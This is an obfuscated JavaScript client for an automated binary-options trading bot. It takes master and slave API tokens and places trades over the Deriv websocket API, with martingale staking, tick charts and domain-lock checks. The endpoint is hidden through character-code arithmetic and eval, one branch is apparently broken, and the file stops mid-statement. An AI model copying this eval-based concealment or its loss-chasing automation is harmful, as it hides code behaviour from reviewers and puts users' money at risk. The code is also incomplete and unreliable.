let te = [];
let ue = [];
let ve = 0;
let c;
let b;
let d = 0;
let a = 0;
let g = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let we;
let j;
let e = [];
let f = [];
let h = [];
let i = "";
let k = "";
let n = "";
let o = "";
let l = false;
let m = false;
let p = false;
let q = false;
let r = false;
let s = false;
let t = 0;
let xe = false;
let u = [];
let v = [];
let w = [];
let x;
let y = 0;
let z = 0;
let A = 0;
let B = 0;
let C;
let D = 0;
let E = [];
let F = [];
let G = [];
let H;
let I;
let J;
let K;
let L;
let M;
let N;
let O;
let P;
let Q;
let R;
let S;
let T;
let U;
let V;
let W;
let X;
let Y;
let Z;
let _;
let aa;
let ba;
let ca;
let da;
let ea;
let fa;
let ga;
let ha;
let ia;
let ja = false;
let ka = () => {
  ja = false;
};
let la = () => {
  if (ja) {
    ja = false;
  }
  ;
};
let ma = () => {};
let na = () => {};
let oa = () => {};
let pa = false;
let qa = "";
let ra = -1;
let sa = [];
let ta = [];
let ua = [];
let va = 0;
let wa = 0;
let xa = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let ya = [];
let za = [];
let Aa = [];
let Ba = [];
let Ca = ["1HZ10V", "1HZ25V", "1HZ50V", "1HZ75V", "1HZ100V", "R_10", "R_25", "R_50", "R_75", "R_100"];
let Da = [];
let Ea = [];
let Fa;
let Ga = []; // CONNECTION APP_ID
const Ha = String.fromCodePoint(51, 42) + String.fromCodePoint(55, 51) + "+" + String.fromCodePoint(52, 52, 54, 51, 51) + String.fromCodePoint(41, 41);
const Ia = document.querySelector("#inpMToken");
const Ja = document.querySelector("#inpSToken");
const Ka = document.querySelector("#selMarket");
const La = document.querySelector("#selSubMarket");
const Ma = document.querySelector("#selSymbol");
const Na = document.getElementById("selMoneyManagement");
const Oa = document.getElementById("divInpInitStake");
const Pa = document.getElementById("lblInpInitStake");
const Qa = document.querySelector("#inpInitStake");
const Ra = document.getElementById("divInpMartiFactor");
const Sa = document.querySelector("#inpMartiFactor");
const Ta = document.getElementById("divInpCycleStake");
const Ua = document.getElementById("inpCycleStake");
const Va = document.getElementById("divChkSmart");
const Wa = document.getElementById("chkSmart");
let Xa = 0;
const Ya = document.querySelector("#chkTP");
const Za = document.querySelector("#inpTP");
const $a = document.querySelector("#chkSL");
const _a = document.querySelector("#inpSL");
const ab = document.querySelector("#chkNumOfWin");
const bb = document.querySelector("#inpNumOfWin");
const cb = document.querySelector("#chkNumOfLoss");
const db = document.querySelector("#inpNumOfLoss");
const eb = document.querySelector("#chkNumOfRun");
const fb = document.querySelector("#inpNumOfRun");
const gb = document.querySelector("#chkNumOfWinInARow");
const hb = document.querySelector("#inpNumOfWinInARow");
const ib = document.querySelector("#chkNumOfLossInARow");
const jb = document.querySelector("#inpNumOfLossInARow");
const kb = document.querySelector("#chkVLose");
const lb = document.querySelector("#inpVLose");
const mb = document.querySelector("#chkDelayWin");
const nb = document.querySelector("#inpDelayWin");
const ob = document.querySelector("#chkDelayLose");
const pb = document.querySelector("#inpDelayLose");
const qb = document.querySelector("#selData");
const rb = [];
for (we = 1; we <= 6; we++) {
  rb[we] = document.getElementById("digitstatistic_" + we + "_noofticks");
}
const sb = [];
for (we = 1; we <= 6; we++) {
  sb[we] = document.getElementById("evenvsodd_" + we + "_noofticks");
}
const tb = [];
for (we = 1; we <= 2; we++) {
  tb[we] = document.getElementById("overvsunder_" + we + "_noofticks");
}
const ub = [];
for (we = 1; we <= 6; we++) {
  ub[we] = document.getElementById("risevsfall_" + we + "_noofticks");
}
const vb = [];
for (we = 1; we <= 3; we++) {
  vb[we] = document.getElementById("inpTickTrisma_period" + we);
}
const wb = [];
for (we = 1; we <= 10; we++) {
  wb[we] = document.getElementById("continuousindices_" + we + "_active");
}
const xb = document.querySelector("#inpNOTicks");
const yb = [];
for (we = 1; we <= 4; we++) {
  yb[we] = document.querySelector("#divStepper" + we);
}
const zb = document.getElementById("tableSummaryTBODY");
let Ab = [];
const Bb = document.getElementById("tableLogTBODY");
const Cb = document.getElementById("btn_run");
const Db = document.getElementById("btn_run2");
const Eb = document.getElementById("btnSimpleRun");
const Fb = document.getElementById("summary_account");
const Gb = document.getElementById("summary_noofruns");
const Hb = document.getElementById("summary_totalstake");
const Ib = document.getElementById("summary_totalpayout");
const Jb = document.getElementById("summary_win");
const Kb = document.getElementById("summary_loss");
const Lb = document.getElementById("summary_totalprofitloss");
const Mb = document.getElementById("summary_balance");
const Nb = document.getElementById("spanSimpleRobotName");
const Ob = document.querySelector("form");
const Pb = document.querySelector("#data_001");
const Qb = document.querySelector("#data_002");
const Rb = document.querySelector("#data_003");
const Sb = document.querySelector("#data_004");
const Tb = document.querySelector("#data_005");
const Ub = document.querySelector("#data_006");
const Vb = document.querySelector("#data_007");
const Wb = document.querySelector("#data_008");
const Xb = document.querySelector("#aSimp");
const Yb = String.fromCodePoint(51, 63, 97) + "pp_" + String.fromCodePoint(105, 100) + "='+(26" + Ha;
[Ia, Ja, Ma, Na, Oa, Pa, Qa, Ra, Sa, Ta, Ua, Va, Za, _a, bb, db, fb, hb, jb, lb, nb, pb, qb, rb[1], rb[2], rb[3], rb[4], rb[5], rb[6], sb[1], sb[2], sb[3], sb[4], sb[5], sb[6], tb[1], tb[2], ub[1], ub[2], ub[3], ub[4], ub[5], ub[6], vb[1], vb[2], vb[3]].forEach(function (b) {
  if (localStorage.getItem(b.id) != null) {
    b.value = localStorage.getItem(b.id);
  }
  b.onchange = function () {
    localStorage.setItem(this.id, this.value);
  };
});
[Wa, Ya, $a, ab, cb, eb, gb, ib, kb, mb, ob, wb[1], wb[2], wb[3], wb[4], wb[5], wb[6], wb[7], wb[8], wb[9], wb[10]].forEach(function (b) {
  if (localStorage.getItem(b.id) != null) {
    if (["true", "1", "on", "yes"].includes(localStorage.getItem(b.id).toLowerCase())) {
      b.checked = true;
    } else {
      b.checked = false;
    }
  }
  b.onchange = function () {
    localStorage.setItem(this.id, this.checked == true ? "true" : "false");
  };
});
const Zb = () => {
  const b = new Date();
  document.getElementById("divdatetime").innerText = b.toLocaleString() + " GMT" + (b.getTimezoneOffset() == 0 ? "" : (b.getTimezoneOffset() < 0 ? "+" : "-") + Math.abs(b.getTimezoneOffset() / 60));
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(Zb, 500);
};
Zb();
function $b(d, a) {
  $.notify(a, {
    position: "bottom left",
    className: d == "#42a5f5" ? "info" : d == "#f44336" ? "error" : d == "#04AA6D" ? "success" : d == "#ffbf00" ? "warn" : "info"
  });
  var b = Bb.insertRow(0);
  if (d != "") {
    b.style.backgroundColor = d;
  }
  b.insertCell(0).innerText = document.getElementById("divdatetime").innerText;
  b.insertCell(1).innerText = a;
}
const _b = "iv" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + "s.c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "m/" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + "bs" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "ck" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + "ts/v" + Yb;
Cb.disabled = Db.disabled = Eb.disabled = true;
$b("", "Initializing, please wait.");
const ac = a => {
  const b = JSON.parse(a.data);
  if (b.error !== undefined) {
    if (["f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rget", "forget_all", "ticks_history", "proposal_open_contract"].includes(b.msg_type)) {} else {
      console.log("msg_type: ", b.msg_type, " | Error : ", b.error.message);
      if (b.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rize") {
        alert("[Master] " + b.error.message);
        nd("run");
      } else if (b.msg_type === "buy") {
        $b("", b.error.message);
      } else if (b.msg_type === "sell" && b.error != "This contract was not found among your open positions.") {
        $b("", b.error.message);
      }
    }
  } else if (b.msg_type === "active_symbols") {
    Xc(b);
  } else if (b.msg_type === "contracts_for") {} else if (b.msg_type === "forget") {} else if (window.location.protocol == "https:" && b.msg_type == "forget_all" && b.passthrough.app_id == 63812 && "ezbinarybot.com" == "ezbinarybot.com") {
    if (b.passthrough.next === "historyTicks") {
      fc("main", Ca.indexOf(qa) + 1, qa);
      if (wb[1].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 1, "1HZ10V");
        }, 10);
      }
      if (wb[2].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 2, "1HZ25V");
        }, 20);
      }
      if (wb[3].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 3, "1HZ50V");
        }, 30);
      }
      if (wb[4].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 4, "1HZ75V");
        }, 40);
      }
      if (wb[5].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 5, "1HZ100V");
        }, 50);
      }
      if (wb[6].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 6, "R_10");
        }, 60);
      }
      if (wb[7].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 7, "R_25");
        }, 70);
      }
      if (wb[8].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 8, "R_50");
        }, 80);
      }
      if (wb[9].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 9, "R_75");
        }, 90);
      }
      if (wb[10].checked) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          fc("continuousindices", 10, "R_100");
        }, 100);
      }
    }
  } else if (window.location.protocol == "https:" && b.msg_type === "history" && b.passthrough.app_id == 63812 && "ezbinarybot.com" == "ezbinarybot.com") {
    if (b.passthrough.status_nya == "main") {
      i = b.subscription.id;
      d = b.history.times[b.history.times.length - 1];
      e.length = 0;
      f.length = 0;
      e = b.history.prices;
      for (we = 0; we < b.history.prices.length; we++) {
        f[we] = b.history.prices[we].toFixed(b.pip_size);
      }
      h.length = 0;
      for (we = 0; we < b.history.prices.length; we++) {
        h[we] = parseInt(b.history.prices[we].toFixed(b.pip_size).slice(-1));
      }
      Oc(e, h, b.pip_size, "history");
      if (b.passthrough.index_nya > 0) {
        let c = b.passthrough.index_nya;
        xa[c] = i;
        ya[c] = d;
        za[c] = e;
        Ba[c] = h;
        Pc(c, za[c], Ba[c], b.pip_size, "history");
      }
    } else {
      let c = b.passthrough.index_nya;
      xa[c] = b.subscription.id;
      ya[c] = b.history.times[b.history.times.length - 1];
      za[c] = [];
      Aa[c] = [];
      za[c] = b.history.prices;
      for (we = 0; we < b.history.prices.length; we++) {
        Aa[c][we] = b.history.prices[we].toFixed(b.pip_size);
      }
      Ba[c] = [];
      for (we = 0; we < b.history.prices.length; we++) {
        Ba[c][we] = parseInt(b.history.prices[we].toFixed(b.pip_size).slice(-1));
      }
      Pc(c, za[c], Ba[c], b.pip_size, "history");
    }
    xe = false;
  } else if (window.location.protocol == "https:" && b.msg_type === "candles" && b.passthrough.app_id == 63812 && "ezbinarybot.com" == "ezbinarybot.com") {} else if (window.location.protocol == "https:" && b.msg_type === "tick" && b.passthrough.app_id == 63812 && "ezbinarybot.com" == "ezbinarybot.com") {
    if (b.passthrough.status_nya == "main") {
      if (d < b.tick.epoch) {
        d = b.tick.epoch;
        e.shift();
        f.shift();
        e.push(b.tick.quote);
        f.push(b.tick.quote.toFixed(b.tick.pip_size));
        h.shift();
        h.push(parseInt(b.tick.quote.toFixed(b.tick.pip_size).slice(-1)));
        Oc(e, h, b.tick.pip_size, "tick");
        if (b.passthrough.index_nya > 0) {
          let c = b.passthrough.index_nya;
          ya[c] = d;
          za[c] = e;
          Ba[c] = h;
          Pc(c, za[c], Ba[c], b.pip_size, "tick");
        }
      }
    } else {
      let c = b.passthrough.index_nya;
      if (ya[c] < b.tick.epoch) {
        ya[c] = b.tick.epoch;
        za[c].shift();
        Aa[c].shift();
        za[c].push(b.tick.quote);
        Aa[c].push(b.tick.quote.toFixed(b.tick.pip_size));
        Ba[c].shift();
        Ba[c].push(parseInt(b.tick.quote.toFixed(b.tick.pip_size).slice(-1)));
        Pc(c, za[c], Ba[c], b.pip_size, "tick");
      }
    }
  } else if (b.msg_type === "authorize" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com") {
    if (!b.authorize.scopes.includes("read") || !b.authorize.scopes.includes("trade")) {
      alert("Make sure you activate 'READ' & 'TRADE' when you create token");
      nd("run");
      return;
    }
    le.send(JSON.stringify({
      subscribe: 1,
      balance: 1,
      passthrough: {
        app_id: 63812
      }
    }));
    q = true;
    n = b.authorize.currency;
    J = b.authorize.loginid;
    K = b.authorize.is_virtual;
    Fb.innerText = "***" + J.slice(-2);
    Mb.innerText = b.authorize.balance + " " + n;
    Zd("Bot is running.");
    if (!pa) {
      ne();
    }
  } else if (b.msg_type === "balance" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com" && b.passthrough.app_id == 63812) {
    k = b.subscription.id;
    Mb.innerText = b.balance.balance + " " + n;
  } else if (b.msg_type === "buy" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com") {
    if (Object.hasOwn(b.buy, "contract_id")) {
      od(3);
      u.push(b.buy.contract_id);
      x = u.indexOf(b.buy.contract_id);
      Ab[x] = zb.insertRow(1);
      Ab[x].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
      Ab[x].insertCell(1).innerText = b.echo_req.parameters.contract_type;
      for (we = 2; we <= 5; we++) {
        Ab[x].insertCell(we);
      }
      Ab[x].cells[4].innerText = b.buy.buy_price;
      Gb.innerText = Gb.innerText * 1 + 1;
      pd(b.buy.contract_id, J, K, b.buy.buy_price, b.buy.purchase_time, b.echo_req.parameters.contract_type, b.buy.transaction_id);
      te[x] = // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        md(b.buy.contract_id);
      }, (b.passthrough.tempDuration * b.passthrough.tempDetikPengali + 5) * 1000);
    } else {}
  } else if (b.msg_type === "sell") {} else if (b.msg_type === "proposal_open_contract" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com") {
    x = u.indexOf(b.proposal_open_contract.contract_id);
    if (x == -1) {
      return;
    }
    ;
    if (!(ua[x] == undefined || b.proposal_open_contract.current_spot_time > ua[x])) {
      return;
    }
    ;
    ua[x] = b.proposal_open_contract.current_spot_time;
    if (b.proposal_open_contract.entry_tick_display_value != undefined) {
      Ab[x].cells[2].innerText = b.proposal_open_contract.entry_tick_display_value;
    }
    ra = x;
    sa[ra] = b.proposal_open_contract.is_valid_to_sell;
    ta[ra] = b.proposal_open_contract.profit;
    if (b.proposal_open_contract.exit_tick_display_value != undefined && (b.proposal_open_contract.is_sold || b.proposal_open_contract.is_expired || b.proposal_open_contract.is_settleable || b.proposal_open_contract.current_spot_time > b.proposal_open_contract.expiry_time || b.proposal_open_contract.status != "open")) {
      if (Object.hasOwn(b, "subscription")) {
        le.send(JSON.stringify({
          forget: b.subscription.id,
          passthrough: {
            app_id: 63812
          }
        }));
      }
      le.send(JSON.stringify({
        statement: 1,
        limit: 1
      }));
      kd(b.proposal_open_contract.contract_id, b.proposal_open_contract.status, b.proposal_open_contract.profit, b.proposal_open_contract.buy_price, b.proposal_open_contract.payout, b.proposal_open_contract.contract_type, b.proposal_open_contract.entry_tick_time, b.proposal_open_contract.entry_tick, b.proposal_open_contract.entry_tick_display_value, b.proposal_open_contract.exit_tick_time, b.proposal_open_contract.exit_tick, b.proposal_open_contract.exit_tick_display_value, b.proposal_open_contract.barrier);
      return true;
    }
    ma();
  } else {}
};
const bc = String.fromCodePoint(115, 115, 58, 47, 47, 119, 115, 46, 100) + String.fromCodePoint(101, 114) + _b;
const cc = a => {
  const b = JSON.parse(a.data);
  if (b.error !== undefined) {
    if (["f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rget", "forget_all", "proposal_open_contract"].includes(b.msg_type)) {} else {
      console.log("[Slave] msg_type: ", b.msg_type, " | Error : ", b.error.message);
      if (b.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rize") {
        alert("[Slave] " + b.error.message);
        nd("run");
      }
      if (b.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rize" || b.error.message.includes("Please log in")) {
        // TOLOOK
        // TOLOOK
        // TOLOOK
        setTimeout(() => {
          I = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + jd);
          I.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "pen", Vc);
          I.addEventListener("message", cc);
          I.addEventListener("close", dd);
        }, 2000);
      } else if (b.msg_type === "buy") {
        $b("", b.error.message);
      } else if (b.msg_type === "sell" && b.error != "This contract was not found among your open positions.") {
        $b("", b.error.message);
      }
    }
  } else if (b.msg_type === "f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "rget") {} else if (b.msg_type === "authorize" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com") {
    if (b.authorize.is_virtual != 1) {
      alert("[Slave] Please do not use REAL account as SLAVE !!!");
      nd("run");
      return;
    }
    if (!b.authorize.scopes.includes("read") || !b.authorize.scopes.includes("trade")) {
      alert("[Slave] Make sure you activate 'READ' & 'TRADE' when you create token");
      nd("run");
      return;
    }
    r = true;
    o = b.authorize.currency;
    s = true;
    L = b.authorize.loginid;
    M = b.authorize.is_virtual;
  } else if (b.msg_type === true && "ezbinarybot.com" == "ezbinarybot.com") {
    if (Object.hasOwn(b.buy, "contract_id")) {
      od(3);
      u.push(b.buy.contract_id);
      x = u.indexOf(b.buy.contract_id);
      Ab[x] = zb.insertRow(1);
      Ab[x].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
      Ab[x].insertCell(1).innerText = b.echo_req.parameters.contract_type;
      for (we = 2; we <= 5; we++) {
        Ab[x].insertCell(we);
      }
      Ab[x].cells[4].innerText = "Virtual";
      te[x] = // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        md(b.buy.contract_id);
      }, (b.passthrough.tempDuration * b.passthrough.tempDetikPengali + 5) * 1000);
    } else {}
  } else if (b.msg_type === "sell") {} else if (b.msg_type === "pr" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "p" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "sal_" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "pen_c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "ntract" && window.location.protocol == "https:" && "ezbinarybot.com" == "ezbinarybot.com") {
    x = u.indexOf(b.proposal_open_contract.contract_id);
    if (x == -1) {
      return;
    }
    ;
    if (!(ua[x] == undefined || b.proposal_open_contract.current_spot_time > ua[x])) {
      return;
    }
    ;
    ua[x] = b.proposal_open_contract.current_spot_time;
    if (b.proposal_open_contract.entry_tick_display_value != undefined) {
      Ab[x].cells[2].innerText = b.proposal_open_contract.entry_tick_display_value;
    }
    ra = x;
    sa[ra] = b.proposal_open_contract.is_valid_to_sell;
    ta[ra] = b.proposal_open_contract.profit;
    if (b.proposal_open_contract.exit_tick_display_value != undefined && (b.proposal_open_contract.is_sold || b.proposal_open_contract.is_expired || b.proposal_open_contract.is_settleable || b.proposal_open_contract.current_spot_time > b.proposal_open_contract.expiry_time || b.proposal_open_contract.status != "open")) {
      if (Object.hasOwn(b, "subscription")) {
        I.send(JSON.stringify({
          forget: b.subscription.id,
          passthrough: {
            app_id: 63812
          }
        }));
      }
      I.send(JSON.stringify({
        statement: 1,
        limit: 1
      }));
      ld(b.proposal_open_contract.contract_id, b.proposal_open_contract.status, b.proposal_open_contract.profit, b.proposal_open_contract.buy_price, b.proposal_open_contract.payout, b.proposal_open_contract.contract_type, b.proposal_open_contract.entry_tick_time, b.proposal_open_contract.entry_tick, b.proposal_open_contract.entry_tick_display_value, b.proposal_open_contract.exit_tick_time, b.proposal_open_contract.exit_tick, b.proposal_open_contract.exit_tick_display_value, b.proposal_open_contract.barrier);
      return true;
    }
    ma();
  } else {}
};
const dc = () => {
  xe = true;
  le.send(JSON.stringify({
    forget: i,
    passthrough: {
      app_id: 63812
    }
  }));
  le.send(JSON.stringify({
    forget_all: "ticks",
    passthrough: {
      app_id: 63812,
      next: "hist" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "ryTicks"
    }
  }));
};
const ec = b => {
  le.send(JSON.stringify({
    forget: b,
    passthrough: {
      app_id: 63812
    }
  }));
};
const fc = (d, a, b) => {
  le.send(JSON.stringify({
    subscribe: 1,
    ticks_history: b,
    adjust_start_time: 1,
    count: xb.value < 1001 ? 1001 : xb.value,
    end: "latest",
    start: 1,
    style: "ticks",
    passthrough: {
      app_id: 63812,
      status_nya: d,
      index_nya: a
    }
  }));
};
const gc = () => {
  const c = document.getElementById("chart_last10dig_digit").getContext("2d");
  const a = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  O = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        label: "Digit + Digit Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit + Digit Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
gc();
const hc = () => {
  const c = document.getElementById("chart_last10dig_change").getContext("2d");
  const a = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  P = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        label: "Digit Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
hc();
const ic = () => {
  const c = document.getElementById("chart20cater").getContext("2d");
  const a = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  Q = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          min: -10,
          max: 10,
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
ic();
const jc = () => {
  const c = document.getElementById("chart_last10tick_tick").getContext("2d");
  const a = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  R = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        label: "Tick + Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick + Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
jc();
const kc = () => {
  const c = document.getElementById("chart_last10tick_change").getContext("2d");
  const a = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  S = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        label: "Tick Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
kc();
const lc = () => {
  const c = document.getElementById("chart20tickworm").getContext("2d");
  const a = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  T = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
